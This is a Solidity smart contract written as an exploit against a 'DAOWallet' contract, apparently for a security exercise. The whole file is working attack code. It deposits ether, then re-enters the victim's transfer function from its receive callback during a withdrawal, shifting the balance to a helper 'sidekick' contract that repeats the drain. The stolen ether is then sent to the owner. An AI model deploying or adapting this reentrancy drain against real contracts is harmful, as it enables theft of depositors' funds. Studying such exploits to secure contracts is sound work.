// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IDAOWallet {
    function withdraw() external;
    function deposit() external payable;
    function transfer(address _recipient, uint256 _amount) external;
}

interface ISidekick {
    function exploit() external payable;
}

contract DAOWalletExploit is Ownable {
    IDAOWallet public victim;
    ISidekick public sidekick;

    constructor(address _target) payable Ownable(msg.sender) {
        victim = IDAOWallet(_target);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        victim.transfer(address(sidekick), 1 ether);
    }

    function exploit() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw();

        if (address(victim).balance >= 1 ether) {
            sidekick.exploit();
        }

        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "Fail to send ETH");
    }
}
